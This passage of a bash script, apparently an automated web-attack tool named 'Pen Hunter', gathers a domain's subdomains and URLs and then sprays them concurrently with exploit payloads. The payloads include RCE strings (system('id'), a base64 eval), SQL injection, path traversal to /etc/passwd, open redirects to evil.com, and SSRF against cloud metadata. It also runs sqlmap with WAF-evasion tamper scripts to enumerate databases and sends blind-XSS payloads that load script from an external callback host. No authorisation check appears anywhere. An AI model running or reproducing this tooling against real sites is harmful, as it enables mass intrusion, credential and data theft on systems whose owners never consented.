            echo -e "${GREEN}Manual CSRF test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}${manual_payload}"
              response=$(curl -s --max-time 10 -d "$manual_payload" "$full_url")
              if echo "$response" | grep -qi "success\|completed"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "rce" ] || [ "$choice" = "rc" ] || [ "$choice" = "7" ]; then
        while true; do
          clear
          echo -e "${BROWN}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${BROWN}RCE Pen Hunter:${NC} ${BROWN}\n 1-Pen Hunter RCE\n 2-RCE-Tool(T) to use a dedicated RCE tool\n 3-Manual RCE test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s rce
          echo -e "${RED}tmux create session rce to see:${NC} tmux a -t rce "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for RCE: $full_path_target...wait${NC}"

            payloads=(
                '$(command)'
                'phpinfo()'
                'system("id")'
                'exec("id")'
                'passthru("id")'
                'shell_exec("id")'
                'eval(base64_decode("c3lzdGVtKCJpZCIp"))'
                'assert(base64_decode("c3lzdGVtKCJpZCIp"))'
            )
            
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            
            check_rce() {
                url="$1"
                for payload in "${payloads[@]}"; do
                    full_url="${url}?input=${payload}"
                    response=$(curl -s --max-time 10 "$full_url")
                    if echo "$response" | grep -qi "uid\|id\|phpinfo"; then
                        echo -e "${GREEN}VULN: ${url}${NC}"
                        echo "Injected URL: $full_url"
                        return
                    fi
                done
            }
            
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_rce "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "rce-tool" ] || [ "$choice" = "T" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s rce && tmux split-window -t rce && tmux send-keys -t rce "cat $full_path_target | while read url; do curl -s \"$url\" | grep -i \"id\|phpinfo\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual RCE test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}?input=${manual_payload}"
              response=$(curl -s --max-time 10 "$full_url")
              if echo "$response" | grep -qi "uid\|id\|phpinfo"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
        echo "Exiting..."
        break
      else
      echo -e "${RED}Invalid choice. Exiting.${NC}"
      break
      fi
    done
    echo -e "\n${GREEN}Mission Complete :)${NC}"
  fi
elif [ "$choice" = "sub" ] || [ "$choice" = "s" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
  clear
  echo -e "${DARK_GREEN}${acsii}${NC}"
  echo -e "${GRAY}Enter the domain for subs:${NC}"
  read -r domain

  # Validate the input
  if [[ -z "$domain" ]]; then
    echo -e "${RED}No domain provided. Exiting.${NC}"
    exit 1
  fi

  base_dir="penhunter/subdomains"
  target_file="${domain}_urls_targets.txt"
  full_path="$base_dir/$domain"
  full_path_target="$full_path/$target_file"
  subs_d="$full_path/subs.txt"

  if [ -d "$full_path" ]; then
      echo "The directory '$full_path' already exists."
  else

      # Create the directory
      mkdir "$full_path"
      echo "Directory '$full_path' created."
  fi


  trap 'echo -e "\n${YELLOW}(q)uite or (n)ext?${NC}"; read -r answer; if [[ $answer == "q" ]]; then exit; elif [[ $answer == "n" ]]; then skip=true; fi' SIGINT
  perform_task() {
      if [ "$skip" == true ]; then
          skip=false
          return
      fi

      echo -e "${YELLOW}Fetching subdomains for ${domain}...${NC}"
      (subfinder -d $domain -silent -nc | httpx -mc 200 -silent -nc | anew -q $full_path/subs.txt ) 2>/dev/null
      echo -e "${YELLOW}Subdomains for ${domain} saved.${NC}"

      subs_d="$full_path/subs.txt"

      echo -e "${YELLOW}Fetching URLs by katana for ${domain}...${NC}"
      katana -u $subs_d -silent -d 10 -jc -kf -fx | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | grep "$domain" | sed -n '/^http/p' | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by wayback for ${domain}...${NC}"
      cat $subs_d | (gau || hakrawler || waybackurls) | sed -n '/^http/p' | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by wayback for ${domain} again...${NC}"
      cat $subs_d | gau | sed -n '/^http/p' | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by wayback for ${domain} once more...${NC}"
      cat $subs_d | gauplus -random-agent -t 10 | sed -n '/^http/p' | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by web.archive for ${domain}...${NC}"
      curl -s "http://web.archive.org/cdx/search/cdx?url=$domain/*&output=text&fl=original&collapse=urlkey" | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | sed -n '/^http/p' | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by gospider for ${domain}...${NC}"
      gospider -S $subs_d -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" -q | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by paramspider for ${domain}...${NC}"
      paramspider -d $domain --subs -o $target_file > /dev/null 2>&1
      cat output/$target_file | grep "$domain" | qsreplace '' | sed -n '/^http/p' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by cariddi for ${domain}...${NC}"
      cat $subs_d | cariddi -intensive -t 50 -rua 2>/dev/null | sed -e 's/.*: \(https*:\/\/[^ ]*\).*/\1/' | qsreplace ''| anew -q $target_file

      echo -e "${YELLOW}Fetching URLs by online tools for ${domain}...${NC}"
      cat $subs_d | getJS --complete | anew -q $target_file

      echo -e "${YELLOW}Fetching URLs and searching for potential XSS by JS variables for ${domain}...${NC}"
      cat $full_path_target | grep "$domain" | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read -r url; do
          vars=$(timeout 10 curl -s "$url" | grep -Eo "var [a-zA-Z0-9]+" | sed -e "s,var,${url}?,g" -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=/g')
          echo -e "\e$vars"
      done | sed -n '/^http/p' | qsreplace '' | anew -q $full_path_target

      echo -e "${GREEN}Potential XSS targets saved to ${full_path_target}${NC}"
  }

  if [ -f "$full_path_target" ]; then
      echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
  else
      skip=false
      perform_task
  fi
  if [ -f "output/$target_file" ]; then
    cat output/$target_file | grep "$domain" | qsreplace '' | sed -n '/^http/p' | anew -q $full_path_target
    rm output/$target_file
  fi
  total_urls=$(wc -l < "$full_path_target")
  clear
  echo -e "${RED}${acsii}${NC}"
  echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
  echo -e "${YELLOW}Total URLs to process: ${total_urls}${NC}"
  read -r -p "$(echo -e "${RED}Do you want to use Pen hunter(Y/n): ${NC}")" choice
  if [ "$choice" = "Y" ] || [ "$choice" = "y" ]; then
    while true; do
      clear
      echo -e "${GREEN}${acsii}${NC}"
      echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
      echo -e "${RED}Pen Hunter:${NC}${GREEN}\n 1-xss(xs) for XSS (Cross-Site Scripting)${NC}\n${YELLOW} 2-sqli(sq) for SQL Injection${NC}\n${BLUE} 3-lfi(lf) for Local File Inclusion${NC}\n${MAGENTA} 4-redirect(rd) for Open Redirect${NC}\n${CYAN} 5-ssrf(sf) for Server-Side Request Forgery${NC}\n${PURPLE} 6-csrf(cf) for Cross-Site Request Forgery${NC}\n${BROWN} 7-rce(rc) for Remote Code Execution${NC}\n 9-exit(x) to exit"
      read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
      if [ "$choice" = "xss" ] || [ "$choice" = "xs" ] || [ "$choice" = "1" ]; then
        while true; do
          clear
          echo -e "${GREEN}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${RED}XSS Pen hunter:${NC} ${GREEN}\n 1-Penhunter xss\n 2-dalfox(d) to use dalfox\n 3-bxss(b) to use BXSS more fast\n 4-myxss(M) for advanced take time\n 5-xsstrike(s) for xsstrike with blind${NC}\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s xss
          echo -e "${RED}tmux create session xss to see:${NC} tmux a -t xss "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for sqli: $full_path_target...wait${NC}"
            #xss payload
            payload='%22%3E%3Cscript%20itworksinallbrowsers%3E%2F%2A%3Cscript%2A%20%2A%2Falert%28123456%29%3C%2Fscript%3E'
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }

            filter_xssd() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    echo "$url"
                fi
            }
            
            qsreplace() {
                url="$1"
                echo "${url%%=*}=${payload}"
            }

            check_xss() {
                url="$1"
                response=$(curl -s --max-time 10 "$url")
                result=$(echo "$response" | grep -o "alert(123456)" | wc -l)
                if [ "$result" -gt 0 ]; then
                    echo -e "${RED}Vuln [${result}]:${NC} $url"
                fi
            }
            
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    filtered_url=$(filter_xssd "$url")
                    if [ -n "$filtered_url" ]; then
                        injected_url=$(qsreplace "$filtered_url")
                        if (( current_requests >= max_concurrent_requests )); then
                            wait -n
                            current_requests=$((current_requests - 1))
                        fi
                        check_xss "$injected_url" &
                        current_requests=$((current_requests + 1))
                    fi
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "1" ]; then
              break
            fi
          elif [ "$choice" = "dalfox" ] || [ "$choice" = "d" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s xss && tmux send-key -t xss "cat $full_path_target | sed -n '/^http/p' | sed -n '/http[s]*:\/\/$domain/p' | sed '/\.js/d' | sed '/\.css/d' | sed '/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d' | qsreplace '' | anew | grep -Ev '\.(txt|js|pdf|png|jpeg|jpg|json|css)$' | dalfox pipe -b https://xss.report/c/YOUR xss.report -F http://evil.com --ignore-return 404,403 -o $full_path/$domain-dalfox.txt" C-m
          elif [ "$choice" = "bxss" ] || [ "$choice" = "b" ] || [ "$choice" = "3" ]; then
            tmux new-session -d -s xss && tmux split-window -t xss && tmux send-keys -t xss "cat $full_path_target | grep '=' | sed -n '/http[s]*:\/\/$domain/p' | bxss -appendMode -payload '><script src=https://xss.report/c/YOUR xss.report></script>' -parameters | anew -q $full_path/$domain.xss.txt" C-m
          elif [ "$choice" = "myxss" ] || [ "$choice" = "M" ] || [ "$choice" = "4" ]; then
            echo -e "${BLUE}What payloads file: \n 1-N for xss_advanced.txt  \n 2-S for xss_more_advanced.txt \n 3-M for xss.rerport payload${NC}\n9-exit(x) to exit"
            read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
            
            case "$choice" in
              "N"|"n"|"1")
                payload_file="penhunter/payload/xss_advanced.txt"
                echo "Selected payload file: $payload_file"
                ;;
              "S"|"s"|"2")
                payload_file="penhunter/payload/xss_more_advanced.txt"
                echo "Selected payload file: $payload_file"
                ;;
              "M"|"m"|"3")
                payload_file="penhunter/payload/xss_payload.txt"
                echo "Selected payload file: $payload_file"
                ;;
              "exit"|"x"|"9")
                echo "Exiting..."
                break
                ;;
              *)
                echo -e "${RED}Invalid choice. Exiting.${NC}"
                break
                ;;
            esac

            total_payloads=$(wc -l < "$payload_file")
            total_urls=$(wc -l < "$full_path_target")
            total_operations=$((total_urls * total_payloads))
            echo -e "${GREEN}Total operations to perform: ${total_operations}${NC}"

            processed_operations=0

            while IFS= read -r payload; do
              while IFS= read -r url; do
                result=$(echo "$url" | sed -e 's/.*: \(https*:\/\/[^ ]*\).*/\1/' | sed -n '/http[s]*:\/\/$domain/p' | sed '/\.js/d' | sed '/\.css/d' | sed '/\.exe/d' | sed  "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | grep "=" | gf allparam | qsreplace "$payload" | freq | egrep -v 'Not'| grep "http" )
                if [ -n "$result" ]; then
                  echo -e "\n${RED}Vulnerable URL detected: ${GREEN}$result${NC}" | anew $full_path/$domain.xss.txt
                fi

                ((processed_operations++))
                
                percentage=$((processed_operations * 100 / total_operations))
                echo -ne "\r${YELLOW}Total operations to perform: $processed_operations/$total_operations ($percentage%)${NC}"
              done < "$full_path_target"
            done < "$payload_file"
            echo -e "\n${GREEN}Mission Complete :)${NC}"
          elif [ "$choice" = "xsstrike" ] || [ "$choice" = "s" ] || [ "$choice" = "4" ]; then
            tmux new-session -d -s xss && tmux split-window -t xss && tmux send-keys -t xss "xsstrike --seeds $full_path_target -t 10 > $full_path/xsstrike_target.txt" C-m
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "sqli" ] || [ "$choice" = "sq" ] || [ "$choice" = "2" ]; then
        while true; do
          clear
          echo -e "${YELLOW}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${RED}sqli Pen hunter:${NC} ${YELLOW}\n 1-Penhunter sqli\n 2-sqlmap(S) to use sqlmap\n 3-ghauri(G) to use ghauri more deep\n 4-mysqli(M) for advanced${NC}\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s sqli
          echo -e "${RED}tmux create session sqli to see:${NC} tmux a -t sqli "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for sqli: $full_path_target...wait${NC}"
            
            payloads=(
                "'"
                "' OR '1'='1"
                "\" OR \"1\"=\"1"
                "' OR 'a'='a"
                "' AND 1=1--"
                "\" AND 1=1--"
            )
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            check_sqli() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    for payload in "${payloads[@]}"; do
                        full_url="${url}${payload}"
                        response=$(curl -s --max-time 10 "$full_url")
                        if echo "$response" | grep -qi "you have an error in your sql syntax\|warning: mysql\|Error:\|Warning:\|unclosed quotation mark\|quoted string not properly terminated\|sql error\|database error\|syntax error\|sql exception"; then
                            echo -e "${GREEN}VULN: ${url}${NC}"
                            echo "Injected URL: $full_url"
                            return
                        fi
                    done
                fi
            }
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_sqli "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "1" ]; then
              break
            fi
          elif [ "$choice" = "sqlmap" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s sqli && tmux split-window -t sqli && tmux send-keys -t sqli "cat $full_path_target | sed -n '/http[s]*:\/\/$domain/p' | gf sqli | sqlmap --batch --output-dir=$full_path/sqlmap --risk=3 --level=3 --dbs --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes  --no-cast --no-escape --threads=10 --fresh-queries --random-agent" C-m
          elif [ "$choice" = "ghauri" ] || [ "$choice" = "G" ] || [ "$choice" = "2" ]; then
            echo -e "${RED}update${NC}" #tmux split-window -t sqli && tmux send-keys -t sqli "cat $full_path_target | grep '=' | bxss -appendMode -payload '><script src=https://xss.report/c/YOUR xss.report></script>' -parameters" C-m
          elif [ "$choice" = "mysqli" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            tmux new-session -d -s sqli && tmux split-window -t sqli && tmux send-keys -t sqli "cat $full_path_target | sed -n '/http[s]*:\/\/$domain/p' | gf sqli | python3 sqli/sqli.py -p penhunter/payload/xor.txt -t 10 | anew $full_path/$domain.sqli.txt" C-m
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done  
      elif [ "$choice" = "lfi" ] || [ "$choice" = "lf" ] || [ "$choice" = "3" ]; then
        while true; do
          clear
          echo -e "${BLUE}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${RED}lfi Pen hunter:${NC} ${BLUE}\n 1-Penhunter lfi\n 2-nuclei(S) to use lfi\n 3-lfibasic(L) to use ghauri more deep\n 4-mysqli(M) for advanced${NC}\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s lfi
          echo -e "${BLUE}tmux create session lfi to see:${NC} tmux a -t lfi "
          #tmux new-session -d -s lfi
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo "${GREEN}Penhunter search to lfi: $full_path_target... wait${NC}"
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }


            check_lfi() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    modified_url="${url//=/=../../../../../../etc/passwd}"
                    response=$(curl -s --max-time 10 "$modified_url")
                    if echo "$response" | grep -q ":x:"; then
                        echo -e "${GREEN}VULN: ${url}${NC}"
                        echo "Injected URL: $modified_url"
                    fi
                fi
            }

            # Main function
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_lfi "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "1" ]; then
              break
            fi
          elif [ "$choice" = "nuclei" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
            tmux split-window -t lfi && tmux send-keys -t lfi "cat $full_path_target | sed -n '/http[s]*:\/\/$domain/p' | nuclei -c 200 -tags lfi -o $full_path/$domain.lfi_nuclei.txt" C-m
          elif [ "$choice" = "lfibasic" ] || [ "$choice" = "L" ] || [ "$choice" = "3" ]; then
            tmux split-window -t lfi && tmux send-keys -t lfi "cat $full_path_target | gf allparam | qsreplace \".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd\" | xargs -I% -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -Eq \"root|:x:|admin\" && echo \"VULN! %\"'| anew $full_path/$domain.lfi.txt" C-m
          elif [ "$choice" = "mysqli" ] || [ "$choice" = "M" ] || [ "$choice" = "4" ]; then
            tmux split-window -t lfi && tmux send-keys -t lfi "cat $full_path_target | qsreplace '.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd' | httpx -silent -nc -mr 'root:x:' -t 250 | anew $full_path/$domain.lfi.txt" C-m
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done 
      elif [ "$choice" = "redirect" ] || [ "$choice" = "rd" ] || [ "$choice" = "4" ]; then
        while true; do
          clear
          echo -e "${MAGENTA}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${MAGENTA}Open Redirect Pen Hunter:${NC} ${MAGENTA}\n 1-Pen Hunter redirect\n 2-redirect-checker(R) to use redirect checker\n 3-Manual redirect test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s redirect
          echo -e "${RED}tmux create session redirect to see:${NC} tmux a -t redirect "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for open redirects: $full_path_target...wait${NC}"
            
            payloads=(
                "http://evil.com"
                "//evil.com"
                "/\evil.com"
                "/%5Cevil.com"
                "%2Fevil.com"
            )
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            check_redirect() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    for payload in "${payloads[@]}"; do
                        full_url="${url}${payload}"
                        response=$(curl -s -I --max-time 10 "$full_url" | grep -i "location:")
                        if echo "$response" | grep -qi "evil.com"; then
                            echo -e "${GREEN}VULN: ${url}${NC}"
                            echo "Injected URL: $full_url"
                            return
                        fi
                    done
                fi
            }
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_redirect "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "redirect-checker" ] || [ "$choice" = "R" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s redirect && tmux split-window -t redirect && tmux send-keys -t redirect "cat $full_path_target | while read url; do curl -s -I \"$url\" | grep -i \"location:\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual open redirect test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}${manual_payload}"
              response=$(curl -s -I --max-time 10 "$full_url" | grep -i "location:")
              if echo "$response" | grep -qi "${manual_payload}"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "ssrf" ] || [ "$choice" = "sf" ] || [ "$choice" = "5" ]; then
        while true; do
          clear
          echo -e "${CYAN}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${CYAN}SSRF Pen Hunter:${NC} ${CYAN}\n 1-Pen Hunter SSRF\n 2-SSRF-checker(S) to use ssrf checker\n 3-Manual SSRF test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s ssrf
          echo -e "${RED}tmux create session ssrf to see:${NC} tmux a -t ssrf "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for SSRF: $full_path_target...wait${NC}"
            
            payloads=(
                "http://localhost:80"
                "http://127.0.0.1:80"
                "http://169.254.169.254/latest/meta-data/"
                "http://[::]:80"
                "http://[::1]:80"
                "file:///etc/passwd"
            )
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            check_ssrf() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    for payload in "${payloads[@]}"; do
                        full_url="${url}${payload}"
                        response=$(curl -s --max-time 10 "$full_url")
                        if echo "$response" | grep -qi "root:x:0:0"; then
                            echo -e "${GREEN}VULN: ${url}${NC}"
                            echo "Injected URL: $full_url"
                            return
                        fi
                    done
                fi
            }
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_ssrf "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "ssrf-checker" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s ssrf && tmux split-window -t ssrf && tmux send-keys -t ssrf "cat $full_path_target | while read url; do curl -s -I \"$url\" | grep -i \"location:\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual SSRF test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
